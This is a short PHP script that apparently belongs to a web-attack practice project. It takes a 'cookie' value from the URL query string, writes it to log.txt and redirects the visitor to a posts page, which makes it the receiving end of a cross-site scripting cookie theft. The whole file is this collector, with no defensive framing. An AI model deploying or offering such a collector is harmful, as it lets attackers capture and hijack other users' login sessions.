<?php

$cookie = $_GET['cookie'];

file_put_contents('log.txt', $cookie);

header('Location: /web_attack/web_attack/all-post.php');

?>